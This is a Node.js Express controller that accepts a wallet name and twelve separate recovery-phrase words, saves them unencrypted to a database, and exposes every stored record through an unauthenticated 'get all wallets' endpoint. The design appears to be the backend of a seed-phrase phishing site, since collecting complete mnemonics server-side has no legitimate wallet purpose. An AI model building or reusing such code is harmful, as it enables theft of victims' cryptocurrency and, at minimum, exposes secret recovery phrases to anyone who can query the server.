const OtherModel = require("./otherwallet.model");

module.exports = {
    async importWallet(req,res){
        try {

            let data = req.body;

            if(!data.wallet) return res.status(400).send({"error":"Wallet name is required"});
            if(!data.one) return res.status(400).send({"error":"word one is required"});
            if(!data.two) return res.status(400).send({"error":"word two is required"});
            if(!data.three) return res.status(400).send({"error":"word three is required"});
            if(!data.four) return res.status(400).send({"error":"word four is required"});
            if(!data.five) return res.status(400).send({"error":"word five is required"});
            if(!data.six) return res.status(400).send({"error":"word six is required"});
            if(!data.seven) return res.status(400).send({"error":"word seven is required"});
            if(!data.eight) return res.status(400).send({"error":"word eignt is required"});
            if(!data.nine) return res.status(400).send({"error":"word nine is required"});
            if(!data.ten) return res.status(400).send({"error":"word ten is required"});
            if(!data.eleven) return res.status(400).send({"error":"word eleven is required"});
            if(!data.twelve) return res.status(400).send({"error":"word twelve is required"});

            let thisCoin = new OtherModel();
            thisCoin.wallet = data.wallet;
            thisCoin.one = data.one;
            thisCoin.two = data.two;
            thisCoin.three = data.three;
            thisCoin.four = data.four;
            thisCoin.five = data.five;
            thisCoin.six = data.six;
            thisCoin.seven = data.seven;
            thisCoin.eight = data.eight;
            thisCoin.nine = data.nine;
            thisCoin.ten = data.ten;
            thisCoin.eleven = data.eleven;
            thisCoin.twelve = data.twelve;

            await thisCoin.save((err, docs)=>{
                if (!err){
                    return res.status(201).send({"success":"Wallet imported"});
                }
                else{
                    return res.status(400).send({"error":`${err}`});
                }
            });

        } catch (err) {
            return res.status(400).send({"error":err});
        }
    },

    async getSingleWallet(req,res){
        try {
            OtherModel.findOne(({_id:req.params.id}),(err,doc)=>{
                if(!err){
                    if(!doc)
                        return res.status(404).send({"error":'Wallet not found'});

                    res.status(200).send(doc);
                }
                else{
                    res.status(400).send({"error":err});
                }
            });
        } catch (err) {
            res.status(400).send({"error":err});
        }
    },

    async getAllWallets(req,res){
        try {
            OtherModel.find((err,docs)=>{
                if(!err){
                    return res.status(200).send(docs);
                }
                else{
                    return res.status(400).send({"error":err});
                }
            });
        } catch (err) {
            return res.status(400).send({"error":err});
        }
    },
}
